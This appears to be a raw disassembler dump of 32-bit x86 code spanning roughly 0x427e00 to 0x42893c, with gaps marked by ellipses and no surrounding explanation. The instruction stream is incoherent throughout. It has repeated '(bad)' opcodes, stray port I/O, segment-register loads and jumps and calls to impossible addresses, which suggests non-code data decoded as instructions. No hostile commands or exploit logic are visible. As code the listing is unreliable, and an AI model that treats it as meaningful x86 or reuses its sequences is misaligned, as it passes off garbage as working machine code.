  427e00:	loop   0x427dbd
  427e02:	sbb    esp,DWORD PTR [ebx-0x690f7f24]
  427e08:	cmp    BYTE PTR [ecx+0x22],dl
  427e0b:	jecxz  0x427e50
  427e0d:	cmp    eax,0xa0cb3b46
  427e12:	lahf   
  427e13:	add    eax,DWORD PTR [ebx+0x32]
  427e16:	mov    al,ds:0x58a6365f
  427e1b:	inc    ecx
  427e1c:	cmp    ebp,DWORD PTR [eax+0x1a]
  427e1f:	xchg   BYTE PTR [esi+0x23],bh
  427e22:	push   ss
  427e23:	pop    ss
  427e24:	add    esi,esi
  427e26:	shr    DWORD PTR [edi],0xae
  427e29:	jnp    0x427e16
  427e2b:	xor    DWORD PTR [eax+ebp*4-0x26],eax
  427e2f:	jmp    0x2ae2be09
  427e34:	jmp    0xe3531310
  427e39:	clc    
  427e3a:	cwde   
  427e3b:	xor    eax,0x6ef922aa
  427e40:	aas    
  427e41:	mov    DWORD PTR [eax],0x0
	...
  427eb3:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  427eba:	mov    dh,0xf7
  427ebc:	mov    ebx,esi
  427ebe:	cmp    ebx,edx
  427ec0:	push   ds
  427ec1:	sti    
  427ec2:	mov    WORD PTR [eax-0x62],cs
  427ec5:	test   al,0x1
  427ec7:	add    dh,dh
  427ec9:	add    BYTE PTR [eax],al
  427ecb:	add    BYTE PTR [edi],dl
  427ecd:	lods   al,BYTE PTR ds:[esi]
  427ece:	xor    al,0xa5
  427ed0:	jo     0x427ec4
  427ed2:	sbb    al,0x80
  427ed4:	add    eax,0x2f720666
  427ed9:	jmp    0xeae828af
  427ede:	push   esp
  427edf:	or     al,0xec
  427ee1:	test   ecx,eax
  427ee3:	lods   al,BYTE PTR ds:[esi]
  427ee4:	cli    
  427ee5:	ror    BYTE PTR [ebx-0x22],1
  427ee8:	nop
  427ee9:	je     0x427eb5
  427eeb:	mov    ds:0xb53334a,eax
  427ef0:	shl    BYTE PTR [edx+ebp*4],0x28
  427ef4:	add    eax,0x7c7578ea
  427ef9:	addr16 push cs
  427efb:	mov    esi,fs
  427efd:	adc    DWORD PTR [ebx+ebp*2],eax
  427f00:	sahf   
  427f01:	(bad)  
  427f02:	(bad)  
  427f03:	out    dx,eax
  427f04:	out    dx,al
  427f05:	pop    edx
  427f06:	loop   0x427e9c
  427f08:	mov    cl,0x6d
  427f0a:	int3   
  427f0b:	inc    esp
  427f0c:	mov    WORD PTR [ebx-0x1c],es
  427f0f:	mov    esi,0x795af7c4
  427f14:	fist   WORD PTR [ebx-0x3]
  427f17:	shl    ebp,0x4a
  427f1a:	xor    cl,ah
  427f1c:	push   edi
  427f1d:	inc    ecx
  427f1e:	inc    ecx
  427f1f:	sti    
  427f20:	xor    DWORD PTR [ecx],edx
  427f22:	mov    edx,ebp
  427f24:	out    dx,eax
  427f25:	in     eax,dx
  427f26:	jp     0x427f7b
  427f28:	pop    esi
  427f29:	(bad)  
  427f2c:	adc    al,0x22
  427f2e:	icebp  
  427f2f:	(bad)  
  427f30:	loopne 0x427eff
  427f32:	loop   0x427f97
  427f34:	mov    dh,0xa8
  427f36:	stos   DWORD PTR es:[edi],eax
  427f37:	cwde   
  427f38:	dec    esp
  427f39:	xchg   edx,eax
  427f3a:	cmp    al,0x6c
  427f3c:	arpl   WORD PTR [eax],bx
  427f3e:	xchg   esp,eax
  427f3f:	pop    eax
  427f40:	sbb    eax,0xd2578fb4
  427f45:	popf   
  427f46:	and    ch,BYTE PTR [esi+ebx*4-0x7c14aa5c]
  427f4d:	sbb    eax,0xb9f72fc0
  427f52:	fs popa 
  427f54:	lahf   
  427f55:	add    eax,DWORD PTR [ecx+0x57]
  427f58:	or     ch,BYTE PTR [ebx]
  427f5a:	xchg   ebp,eax
  427f5b:	xchg   edi,esp
  427f5d:	adc    BYTE PTR [esi-0x68],al
  427f60:	fiadd  WORD PTR [esi-0x2e]
  427f63:	arpl   WORD PTR [esi-0x15],bp
  427f66:	daa    
  427f67:	pop    DWORD PTR [eax-0x4de59aa6]
  427f6d:	scas   al,BYTE PTR es:[edi]
  427f6e:	(bad)  
  427f6f:	dec    esp
  427f70:	rcr    BYTE PTR [ecx+0x2b],1
  427f73:	mov    DWORD PTR [ecx-0x50],edx
  427f76:	sbb    DWORD PTR [edi],eax
  427f78:	call   0xcfa13074
  427f7d:	xchg   DWORD PTR [esi+0x101fbb13],eax
  427f83:	test   al,0x52
  427f85:	ss into 
  427f87:	xchg   edi,eax
  427f88:	popa   
  427f89:	mov    ds:0xab85abd,al
  427f8e:	in     eax,dx
  427f8f:	cmp    BYTE PTR [ebp+ebx*8-0x18da9b7f],bh
  427f96:	outs   dx,DWORD PTR ds:[esi]
  427f97:	mov    BYTE PTR [ebx+0x788e3d73],bh
  427f9d:	aad    0x77
  427f9f:	lea    ecx,[ecx+0x63986ede]
  427fa5:	push   es
  427fa6:	or     DWORD PTR [edi-0x7de0a0be],esi
  427fac:	or     al,0x98
  427fae:	retf   0x57b6
  427fb1:	rcl    DWORD PTR [edi-0x59a7eaee],0x97
  427fb8:	dec    edi
  427fb9:	cmp    BYTE PTR [edx],bl
  427fbb:	jno    0x427f77
  427fbd:	sub    DWORD PTR [ebp+0x44],edx
  427fc0:	data16 add BYTE PTR es:[eax],al
	...
  428034:	or     al,0x6d
  428036:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42803c:	mov    DWORD PTR [ebx+0x5a],edx
  42803f:	xchg   edi,esp
  428041:	aad    0xa6
  428043:	or     eax,0x1a994
  428048:	test   BYTE PTR [eax],0x0
  42804b:	add    BYTE PTR [edx],cl
  42804d:	mov    dh,0x79
  42804f:	loopne 0x428033
  428051:	adc    edx,DWORD PTR [edx]
  428053:	shl    cl,cl
  428055:	enter  0x6db3,0xce
  428059:	ins    DWORD PTR es:[edi],dx
  42805a:	jle    0x42803d
  42805c:	sbb    DWORD PTR [esi+0x2061d632],eax
  428062:	ror    BYTE PTR [ecx],cl
  428064:	or     dh,dh
  428066:	pop    esp
  428067:	mov    ch,0x39
  428069:	in     eax,0x8b
  42806b:	js     0x4280c6
  42806d:	idiv   BYTE PTR [ebx-0x103ef9df]
  428073:	push   ebx
  428074:	ins    DWORD PTR es:[edi],dx
  428075:	mov    ds:0x29f683f8,al
  42807a:	push   edx
  42807b:	and    BYTE PTR [ecx-0x7361b6a0],dh
  428081:	mov    ebx,0xe687ab30
  428086:	test   al,0x3c
  428088:	pop    esp
  428089:	jmp    0x4280a7
  42808b:	push   es
  42808c:	and    BYTE PTR [esi+0x47],ch
  42808f:	inc    ebp
  428090:	or     dl,BYTE PTR [edi-0x43]
  428093:	nop
  428094:	and    DWORD PTR [ebp-0x28],ebx
  428097:	jae    0x428103
  428099:	adc    al,0x9c
  42809b:	mov    DWORD PTR [esi+0x42],esp
  42809e:	mov    al,ds:0x9be200a5
  4280a3:	pop    edi
  4280a4:	aaa    
  4280a5:	xchg   ebp,eax
  4280a6:	(bad)  
  4280a7:	in     al,0xca
  4280a9:	pop    edi
  4280aa:	shl    BYTE PTR [edi-0x4cb95534],1
  4280b0:	cdq    
  4280b1:	jo     0x4280fd
  4280b3:	push   cs
  4280b4:	scas   al,BYTE PTR es:[edi]
  4280b5:	sbb    al,0x26
  4280b7:	jnp    0x428126
  4280b9:	pop    ss
  4280ba:	xor    bl,dh
  4280bc:	std    
  4280bd:	dec    ebx
  4280be:	leave  
  4280bf:	dec    edi
  4280c0:	inc    esp
  4280c1:	jle    0x428112
  4280c3:	push   edx
  4280c4:	aam    0xa8
  4280c6:	in     eax,0x18
  4280c8:	xchg   DWORD PTR [esi-0x56],esp
  4280cb:	cdq    
  4280cc:	popa   
  4280cd:	pop    ss
  4280ce:	aas    
  4280cf:	repnz repnz in al,dx
  4280d2:	leave  
  4280d3:	cmp    dh,ch
  4280d5:	and    BYTE PTR [edx],cl
  4280d7:	and    eax,0xd63bf845
  4280dc:	cli    
  4280dd:	push   es
  4280de:	retf   0xbcb6
  4280e1:	jmp    0x428135
  4280e3:	and    ch,BYTE PTR [eax]
  4280e5:	xchg   esp,eax
  4280e6:	push   ebx
  4280e7:	(bad)  
  4280e8:	clc    
  4280e9:	adc    BYTE PTR [ebp+0x2d],bh
  4280ec:	retf   
  4280ed:	pop    ecx
  4280ee:	(bad)  
  4280ef:	adc    DWORD PTR ds:0x11d2ce37,edx
  4280f5:	out    0xc6,eax
  4280f7:	mov    eax,0x1c08f87c
  4280fc:	ror    edx,cl
  4280fe:	sahf   
  4280ff:	xlat   BYTE PTR ds:[ebx]
  428100:	inc    esp
  428101:	jl     0x4280da
  428103:	jg     0x42813b
  428105:	repnz mov al,ds:0xefd0df50
  42810b:	shr    DWORD PTR [esi+0x3e],cl
  42810e:	xchg   ecx,eax
  42810f:	nop
  428110:	adc    al,0x99
  428112:	jge    0x42810e
  428114:	dec    edx
  428115:	push   ebp
  428116:	jne    0x42817f
  428118:	sbb    eax,0x9bcf110c
  42811d:	add    al,0x69
  42811f:	pop    ss
  428120:	aad    0xdc
  428122:	mov    es,WORD PTR [ecx]
  428124:	or     BYTE PTR [eax],bl
  428126:	adc    BYTE PTR [eax],ch
  428128:	leave  
  428129:	inc    esp
  42812a:	je     0x4280fc
  42812c:	pop    ebp
  42812d:	cmp    bl,ch
  42812f:	or     edx,DWORD PTR [edi+0x66]
  428132:	push   esp
  428133:	sti    
  428134:	push   esi
  428135:	imul   ebx,DWORD PTR [esi],0xffffffb6
  428138:	push   cs
  428139:	loop   0x4280e3
  42813b:	loopne 0x428179
  42813d:	les    esi,FWORD PTR [ebx+0xa93615]
	...
  4281b3:	add    BYTE PTR [esi],bl
  4281b5:	inc    ecx
  4281b6:	fdiv   QWORD PTR [edi+ebx*8+0x79eb7ebd]
  4281bd:	stos   BYTE PTR es:[edi],al
  4281be:	push   0x4a44a4f
  4281c3:	add    cl,BYTE PTR [edx-0x9fffe56]
  4281c9:	add    BYTE PTR [eax],al
  4281cb:	add    BYTE PTR [eax+0x4],dh
  4281ce:	ret    
  4281cf:	cs xchg edi,eax
  4281d1:	push   edx
  4281d2:	mov    edx,cs
  4281d4:	push   eax
  4281d5:	or     dh,BYTE PTR [esi-0x1f004a90]
  4281db:	dec    BYTE PTR [ebp-0xb835ba5]
  4281e1:	imul   al
  4281e3:	test   DWORD PTR [edx-0x130ab110],ebp
  4281e9:	adc    al,0xc
  4281eb:	loop   0x4281f0
  4281ed:	or     ch,BYTE PTR [edx]
  4281ef:	out    dx,eax
  4281f0:	or     eax,0xa362467e
  4281f5:	inc    eax
  4281f6:	sbb    al,dh
  4281f8:	adc    dl,BYTE PTR [eax+0x19]
  4281fb:	dec    BYTE PTR [edx+0xc1c8bb5]
  428201:	xor    DWORD PTR [esi+0x4c8db3d],0x727b81c0
  42820b:	ds dec esp
  42820d:	xchg   si,ax
  42820f:	(bad)  
  428210:	mov    ah,0xfe
  428212:	aas    
  428213:	fnstsw WORD PTR [eax]
  428215:	mov    dh,0x7d
  428217:	pop    esp
  428218:	and    DWORD PTR [edi+0x33],0xbca59373
  42821f:	lds    esi,FWORD PTR [edi]
  428221:	mov    ebx,0xc90751e8
  428226:	mov    esi,0xb96fba00
  42822b:	sub    DWORD PTR [esi+0x61fd18dd],esp
  428231:	inc    edi
  428232:	fisubr WORD PTR ds:0x2bb7e8d8
  428238:	and    al,0xc7
  42823a:	ds xor al,0xef
  42823d:	stos   DWORD PTR es:[edi],eax
  42823e:	pop    ebx
  42823f:	dec    ecx
  428240:	pushf  
  428241:	in     eax,dx
  428242:	xor    al,0x27
  428244:	shr    BYTE PTR [ebx-0x763baf36],1
  42824a:	aas    
  42824b:	add    ebx,DWORD PTR [ebx-0x54]
  42824e:	repz lea ebp,[esi+0x4ed3460d]
  428255:	adc    DWORD PTR [eax+0xf],ebx
  428258:	iret   
  428259:	pop    esi
  42825a:	jle    0x428291
  42825c:	pop    edi
  42825d:	imul   edi,DWORD PTR [esi-0x643b6cc5],0x22
  428264:	imul   ebx,DWORD PTR [ebx-0x65e36cab],0xffffffcd
  42826b:	push   ebx
  42826c:	mov    dh,0x8b
  42826e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42826f:	(bad)  
  428271:	nop
  428272:	push   ebp
  428273:	jl     0x428220
  428275:	cdq    
  428276:	adc    BYTE PTR [ebp-0x5],bh
  428279:	icebp  
  42827a:	lods   al,BYTE PTR ds:[esi]
  42827b:	push   ss
  42827c:	adc    ah,ch
  42827e:	sub    BYTE PTR [edx],dh
  428280:	inc    edi
  428281:	mov    bh,0x54
  428283:	mov    ah,0xa2
  428285:	leave  
  428286:	hlt    
  428287:	dec    bl
  428289:	adc    bl,BYTE PTR [esp+ebp*4+0x3db81475]
  428290:	inc    edi
  428291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428292:	mov    bh,0x41
  428294:	nop
  428295:	out    dx,eax
  428296:	dec    DWORD PTR [ecx]
  428298:	jl     0x42823b
  42829a:	shl    bl,cl
  42829c:	and    BYTE PTR [ebx-0x3f67df3],bl
  4282a2:	and    BYTE PTR [ebx-0x57acd106],al
  4282a8:	add    eax,0xc3bc5e7a
  4282ad:	mov    ch,0xef
  4282af:	stos   DWORD PTR es:[edi],eax
  4282b0:	mov    ds:0x8c824e5a,al
  4282b5:	(bad)  
  4282b7:	jle    0x4282d5
  4282b9:	cld    
  4282ba:	fs dec esp
  4282bc:	and    eax,edx
  4282be:	mov    edx,0x2abe85
	...
  428333:	add    BYTE PTR [edx],dl
  428335:	sbb    eax,0xaf3f8832
  42833a:	mov    edx,0x671fe09f
  42833f:	pusha  
  428340:	jno    0x4283ae
  428342:	and    ah,al
  428344:	sub    BYTE PTR [ebx+0xf60001],0x0
  42834b:	add    BYTE PTR [edi],dh
  42834d:	test   al,0xf9
  42834f:	mov    ds:0x7561c424,al
  428354:	pushf  
  428355:	shl    ecx,cl
  428357:	add    BYTE PTR [edx-0x5584d43b],dh
  42835d:	dec    ebx
  42835e:	(bad)  
  42835f:	and    bh,BYTE PTR [ebx-0x4c8814d4]
  428365:	cdq    
  428366:	call   0x2a503d59
  42836b:	int    0x97
  42836d:	out    dx,al
  42836e:	pop    DWORD PTR [esi]
  428370:	leave  
  428371:	loopne 0x4283c7
  428373:	xor    cl,BYTE PTR [ebp-0x28]
  428376:	not    BYTE PTR [esp+edi*4-0x24]
  42837a:	lock jl 0x428314
  42837d:	int    0xe2
  42837f:	push   ebx
  428380:	out    dx,al
  428381:	pop    edx
  428382:	aad    0x3
  428384:	sub    al,0x93
  428386:	mov    esi,0x6a643a94
  42838b:	jae    0x428313
  42838d:	(bad)  
  42838e:	or     al,0xfd
  428390:	rcr    BYTE PTR [edx-0x48],1
  428393:	jp     0x4283da
  428395:	loope  0x4283d0
  428397:	js     0x4283c8
  428399:	cmp    al,0xc1
  42839b:	and    edx,DWORD PTR [esi+esi*2+0x604107dc]
  4283a2:	mov    ecx,0xb7fb3747
  4283a7:	test   al,0x1c
  4283a9:	ret    0xfa38
  4283ac:	or     DWORD PTR [ebp+ebp*4+0x411e5e56],ebp
  4283b3:	mov    es,ebx
  4283b5:	cmp    DWORD PTR [edx+edx*8+0x1c],ebp
  4283b9:	xor    al,0x38
  4283bb:	push   cs
  4283bc:	scas   al,BYTE PTR es:[edi]
  4283bd:	bswap  edi
  4283bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283c0:	ja     0x4283f6
  4283c2:	and    ah,dh
  4283c4:	add    BYTE PTR [eax-0xfffa1f1],0xa6
  4283cb:	pop    esi
  4283cc:	or     edx,edx
  4283ce:	adc    eax,0xc7bc7335
  4283d3:	loopne 0x4283be
  4283d5:	pop    ds
  4283d6:	sti    
  4283d7:	mov    ds:0x54d0db6b,al
  4283dc:	push   ss
  4283dd:	outs   dx,BYTE PTR ds:[esi]
  4283de:	sti    
  4283df:	or     BYTE PTR [ebx],bl
  4283e1:	je     0x4283a3
  4283e3:	cmp    DWORD PTR [edi],edx
  4283e5:	and    DWORD PTR [edx],esi
  4283e7:	stos   DWORD PTR es:[edi],eax
  4283e8:	mov    eax,ds:0x4c64300b
  4283ed:	fcmovnb st,st(6)
  4283ef:	pusha  
  4283f0:	adc    eax,0x30035347
  4283f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4283f6:	lods   al,BYTE PTR ds:[esi]
  4283f7:	test   al,0x22
  4283f9:	scas   al,BYTE PTR es:[edi]
  4283fa:	sub    al,0x2a
  4283fc:	mov    ah,0x16
  4283fe:	push   0x16
  428400:	mov    ds,WORD PTR [edi+0x29a679dd]
  428406:	inc    ebx
  428407:	je     0x428396
  428409:	ja     0x428445
  42840b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42840c:	unpcklps xmm1,XMMWORD PTR [ebx-0x13e693ae]
  428413:	inc    edi
  428414:	sti    
  428415:	pop    ds
  428416:	cmp    eax,0xa91339f9
  42841b:	xchg   BYTE PTR [esi+ebx*4],cl
  42841e:	adc    ah,BYTE PTR [edi+0xa073318]
  428424:	mov    gs,WORD PTR [ecx]
  428426:	mov    BYTE PTR [edi],al
  428428:	mov    WORD PTR [ecx],ss
  42842a:	jne    0x428488
  42842c:	xor    esp,0x7
  42842f:	out    dx,al
  428430:	in     al,0xcc
  428432:	dec    ebx
  428433:	mov    ds:0x9dead1bd,eax
  428438:	mov    eax,0x85ac0004
  42843d:	cwde   
  42843e:	sbb    edi,DWORD PTR [ebp+edx*2+0x76]
	...
  4284b1:	add    BYTE PTR [eax],al
  4284b3:	add    BYTE PTR [eax+ebp*4-0x40],bl
  4284b7:	stos   DWORD PTR es:[edi],eax
  4284b8:	hlt    
  4284b9:	jmp    0x42853a
  4284bb:	jmp    FWORD PTR [ecx-0x1394cbf9]
  4284c1:	rcl    DWORD PTR [edi-0x32],0x76
  4284c5:	lods   al,BYTE PTR ds:[esi]
  4284c6:	add    DWORD PTR [eax],eax
  4284c8:	test   BYTE PTR [eax],0x0
  4284cb:	add    BYTE PTR [edi-0x6a],bl
  4284ce:	add    ch,BYTE PTR [esi]
  4284d0:	fiadd  WORD PTR [edx]
  4284d2:	cmp    BYTE PTR [ebx-0x100d79f9],al
  4284d8:	sbb    al,dl
  4284da:	dec    ebx
  4284db:	addr16 and ch,bh
  4284de:	inc    ebp
  4284df:	or     edi,ecx
  4284e1:	sub    edi,DWORD PTR [eax]
  4284e3:	cmp    ecx,DWORD PTR [edi+0x41]
  4284e6:	jp     0x428565
  4284e8:	xchg   ecx,eax
  4284e9:	in     eax,dx
  4284ea:	pop    edx
  4284eb:	ficom  DWORD PTR [edi-0x727ca3af]
  4284f1:	mov    al,ds:0xf1ec8575
  4284f6:	cli    
  4284f7:	adc    bl,BYTE PTR [esi-0x30490690]
  4284fd:	ja     0x42848a
  4284ff:	dec    ebp
  428500:	data16 sbb ah,ch
  428503:	or     edx,ecx
  428505:	out    0xf6,eax
  428507:	aam    0x30
  428509:	inc    esi
  42850a:	or     DWORD PTR [edi-0x2f],edx
  42850d:	and    bl,BYTE PTR [ebp+0x66]
  428510:	jns    0x428500
  428512:	test   BYTE PTR [edi],dh
  428514:	cmp    edx,DWORD PTR [ecx]
  428516:	cmc    
  428517:	add    BYTE PTR [edx],cl
  428519:	dec    eax
  42851a:	ret    0x5fa8
  42851d:	jnp    0x4284ea
  42851f:	cwde   
  428520:	test   DWORD PTR [esi],eax
  428522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428523:	out    dx,al
  428524:	xchg   ebx,eax
  428525:	push   0x2c900907
  42852a:	pop    si
  42852c:	in     al,dx
  42852d:	dec    ecx
  42852e:	(bad)  
  42852f:	out    dx,eax
  428530:	aad    0x79
  428532:	aaa    
  428533:	fwait
  428534:	aas    
  428535:	sbb    edi,DWORD PTR [edx+0x35]
  428538:	ds (bad) 
  42853a:	fisubr DWORD PTR [edi+0x57]
  42853d:	inc    DWORD PTR [esi+0x523d51c4]
  428543:	xchg   ebx,eax
  428544:	in     al,0x8b
  428546:	out    0x13,eax
  428548:	jmp    0x4284e6
  42854a:	sbb    ecx,ebx
  42854c:	push   0x5e
  42854e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42854f:	loop   0x4285a9
  428551:	daa    
  428552:	pop    ecx
  428553:	mov    DWORD PTR [edx+0x1a3f1c89],ebx
  428559:	idiv   BYTE PTR [ecx-0x49bcb01b]
  42855f:	sbb    ecx,DWORD PTR [eax]
  428561:	shr    eax,0xc0
  428564:	jg     0x4285b0
  428566:	pop    ss
  428567:	adc    dl,BYTE PTR [esi-0x838948d]
  42856d:	sahf   
  42856e:	pop    eax
  42856f:	add    eax,0xba788584
  428574:	sbb    ebp,DWORD PTR [esi-0x36b7e015]
  42857a:	add    edx,DWORD PTR [edi-0x3e25779a]
  428580:	pop    esp
  428581:	add    eax,0x456e0388
  428586:	jns    0x42851c
  428588:	sub    bh,bl
  42858a:	shl    ebp,cl
  42858c:	add    al,0x3e
  42858e:	xor    ch,BYTE PTR [esi]
  428590:	sbb    ebx,DWORD PTR [edi+0x3]
  428593:	sub    eax,0xe578acb3
  428598:	or     al,cl
  42859a:	pushf  
  42859b:	mov    ds:0xb22cc3d1,al
  4285a0:	js     0x428551
  4285a2:	in     al,dx
  4285a3:	sbb    al,0x17
  4285a5:	push   cs
  4285a6:	jecxz  0x428610
  4285a8:	xor    ch,BYTE PTR [edx-0x10]
  4285ab:	mov    ebx,0x8bea119c
  4285b0:	loop   0x428538
  4285b2:	lahf   
  4285b3:	pop    ebp
  4285b4:	xor    al,0xc6
  4285b6:	arpl   WORD PTR [eax+0x6a],si
  4285b9:	das    
  4285ba:	enter  0xbac6,0xdc
  4285be:	xchg   ecx,eax
  4285bf:	sub    BYTE PTR gs:[ebx],cl
	...
  428632:	add    BYTE PTR [eax],al
  428634:	add    DWORD PTR [esi-0x70],edx
  428637:	out    dx,al
  428638:	xlat   BYTE PTR ds:[ebx]
  428639:	out    dx,al
  42863a:	jg     0x42863b
  42863c:	(bad)  
  42863d:	dec    esi
  42863e:	cmp    al,0xb7
  428640:	cmp    ebp,DWORD PTR [ebx-0x4c]
  428643:	(bad)  
  428644:	ins    BYTE PTR es:[edi],dx
  428645:	lods   eax,DWORD PTR ds:[esi]
  428646:	add    DWORD PTR [eax],eax
  428648:	test   BYTE PTR [eax],0x0
  42864b:	add    BYTE PTR [ebp+0x8],bh
  42864e:	mov    eax,ds:0xa9468cb
  428653:	sbb    bl,dl
  428655:	sbb    eax,0xeebeaaf7
  42865a:	push   edi
  42865b:	jnp    0x4286af
  42865d:	push   edx
  42865e:	sti    
  42865f:	cmp    esp,esi
  428661:	mov    ds:0x5b6d5a9b,al
  428666:	hlt    
  428667:	push   esi
  428668:	jne    0x42865d
  42866a:	sub    dl,BYTE PTR [ecx+edi*2+0x453df032]
  428671:	(bad)  
  428672:	outs   dx,DWORD PTR ds:[esi]
  428673:	xchg   esp,eax
  428674:	loopne 0x428647
  428676:	inc    ecx
  428677:	xchg   di,ax
  428679:	mov    ds:0xc3564a79,eax
  42867e:	(bad)  
  42867f:	loope  0x4286cf
  428681:	or     DWORD PTR [edi],esp
  428683:	or     BYTE PTR [eax+0x1c],al
  428686:	jl     0x42860a
  428688:	je     0x428641
  42868a:	ds dec edx
  42868c:	sbb    bh,ah
  42868e:	aad    0x39
  428690:	pop    esi
  428691:	aas    
  428692:	and    eax,0xd8149d87
  428697:	or     bh,al
  428699:	loop   0x4286e5
  42869b:	push   ss
  42869c:	cmp    ebp,edi
  42869e:	and    al,0xe0
  4286a0:	xchg   cl,dl
  4286a2:	mov    ah,0xe0
  4286a4:	fldenv [ebp-0xf53bd9c]
  4286aa:	mov    si,0x60b2
  4286ae:	mov    eax,ds:0xac2d432a
  4286b3:	pop    eax
  4286b4:	jecxz  0x4286fe
  4286b6:	cmp    eax,0x64babbf1
  4286bb:	sub    al,0xab
  4286bd:	cmp    esi,DWORD PTR [ecx]
  4286bf:	fucomi st,st(0)
  4286c1:	mov    edx,0x849d790f
  4286c6:	jecxz  0x428675
  4286c8:	mov    gs,WORD PTR [ebp+0x1e]
  4286cb:	(bad)  
  4286cc:	pusha  
  4286cd:	push   edx
  4286ce:	js     0x428694
  4286d0:	jbe    0x428675
  4286d2:	in     al,0xcd
  4286d4:	xor    al,0xd2
  4286d6:	call   0x78c1d002
  4286db:	jb     0x428681
  4286dd:	enter  0x3e35,0x26
  4286e1:	outs   dx,BYTE PTR ds:[esi]
  4286e2:	int    0x9f
  4286e4:	cmp    DWORD PTR [edx],ebx
  4286e6:	sub    al,0xb8
  4286e8:	jecxz  0x4286ec
  4286ea:	jge    0x4286ad
  4286ec:	test   ch,ch
  4286ee:	cmc    
  4286ef:	je     0x428697
  4286f1:	jb     0x4286c9
  4286f3:	es call 0x16a8:0x4ba9cf7f
  4286fb:	ret    
  4286fc:	and    BYTE PTR [ecx-0x6210cfdf],cl
  428702:	jbe    0x42874a
  428704:	cmp    eax,DWORD PTR [ebx-0x1c]
  428707:	mov    bh,0x67
  428709:	adc    al,0xc3
  42870b:	add    dl,BYTE PTR [ecx-0x317cf57c]
  428711:	std    
  428712:	pop    es
  428713:	sahf   
  428714:	popf   
  428715:	(bad)  
  428716:	clc    
  428717:	mov    edi,0x4513a342
  42871c:	inc    eax
  42871d:	mov    al,ds:0xd58f5637
  428722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428723:	outs   dx,DWORD PTR ds:[esi]
  428724:	jno    0x42871d
  428726:	ins    BYTE PTR es:[edi],dx
  428727:	inc    ecx
  428728:	sbb    al,0x37
  42872a:	inc    eax
  42872b:	xlat   BYTE PTR ds:[ebx]
  42872c:	dec    esp
  42872d:	jns    0x4287a5
  42872f:	(bad)  
  428731:	ret    0xc3b0
  428734:	sbb    BYTE PTR [ebp+0x3d],0xd
  428738:	push   0xd2627c4c
  42873d:	bound  ecx,QWORD PTR [esi]
  42873f:	dec    edx
  428740:	rol    BYTE PTR [ecx+0x0],0x0
	...
  4287b4:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4287ba:	pop    esi
  4287bb:	fbstp  TBYTE PTR [ebx]
  4287bd:	mov    edx,0xb0f7299e
  4287c2:	jne    0x4287ae
  4287c4:	bound  ebp,QWORD PTR [esi+0xf60001]
  4287ca:	add    BYTE PTR [eax],al
  4287cc:	jno    0x42877b
  4287ce:	clc    
  4287cf:	mov    dl,BYTE PTR ds:0xd044efdd
  4287d5:	push   ecx
  4287d6:	fbld   TBYTE PTR [ebx*8+0x2ee5eb54]
  4287dd:	push   0x899dd77f
  4287e2:	popf   
  4287e3:	es mov esp,0x36f962bf
  4287e9:	sub    DWORD PTR ds:[ecx+0x42671d42],eax
  4287f0:	repnz in al,0xd8
  4287f3:	mov    eax,0x7200397f
  4287f8:	xchg   esi,eax
  4287f9:	or     ecx,DWORD PTR [ebp+0x45d0f698]
  4287ff:	push   edi
  428800:	adc    ebx,esp
  428802:	and    BYTE PTR ds:0xcbc2c180,0xe1
  428809:	jb     0x42886d
  42880b:	jp     0x42884d
  42880d:	sub    al,al
  42880f:	in     al,dx
  428810:	xor    edi,DWORD PTR [esi]
  428812:	lahf   
  428813:	out    0xdc,al
  428815:	lods   eax,DWORD PTR ds:[esi]
  428816:	xor    al,0xec
  428818:	add    eax,edx
  42881a:	(bad)  
  42881b:	fcomp  DWORD PTR [eax]
  42881d:	add    eax,0xed0a8987
  428822:	push   es
  428823:	jmp    0xf200584f
  428828:	dec    edx
  428829:	and    BYTE PTR [ecx+0x26],dl
  42882c:	stos   DWORD PTR es:[edi],eax
  42882d:	fstp   DWORD PTR [esi+0x5c7ff6c5]
  428833:	jmp    0x428835
  428835:	and    al,0xa5
  428837:	call   0xcceaa4c8
  42883c:	ret    
  42883d:	jbe    0x4288a8
  42883f:	pop    ds
  428840:	sbb    BYTE PTR [edi+0x4],cl
  428843:	std    
  428844:	and    eax,ecx
  428846:	inc    eax
  428847:	adc    eax,0xbfb3ee74
  42884c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42884d:	ins    BYTE PTR es:[edi],dx
  42884e:	push   edx
  42884f:	mov    edx,0x7adf3e76
  428854:	les    edx,FWORD PTR [ecx-0x614347b2]
  42885a:	ss push eax
  42885c:	jl     0x428830
  42885e:	and    BYTE PTR [esi-0x7298649a],ch
  428864:	lahf   
  428865:	ja     0x4287e8
  428867:	xchg   DWORD PTR [esi-0x9f39c9a],ecx
  42886d:	add    BYTE PTR [esi],cl
  42886f:	add    ecx,edx
  428871:	or     eax,0x2945dddc
  428876:	mov    ds:0x7cec77ea,al
  42887b:	inc    ebp
  42887c:	inc    esp
  42887d:	popa   
  42887e:	bound  ebp,QWORD PTR [ebp-0x3de37473]
  428884:	arpl   si,dx
  428886:	jbe    0x4288b3
  428888:	fcmovbe st,st(1)
  42888a:	mov    al,0xab
  42888c:	loopne 0x4288cd
  42888e:	sub    BYTE PTR [ecx+0x3c1d5486],dl
  428894:	pop    ebx
  428895:	cli    
  428896:	lock mov ds:0x2964cf3c,al
  42889c:	push   ss
  42889d:	add    eax,DWORD PTR [eax-0x122f2bc4]
  4288a3:	fidiv  WORD PTR [ecx]
  4288a5:	mov    esp,0xd41d2205
  4288aa:	add    edi,DWORD PTR [ecx-0x58be2a05]
  4288b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4288b1:	jne    0x42883e
  4288b3:	sub    esi,DWORD PTR [ebp-0xb]
  4288b6:	push   ecx
  4288b7:	fs add eax,ecx
  4288ba:	xchg   BYTE PTR [ebp-0x46],al
  4288bd:	pop    ds
  4288be:	test   DWORD PTR [ecx],0xce16
	...
  428934:	call   0xdea3:0xffa3ffdd
  42893b:	std    
  42893c:	clc    
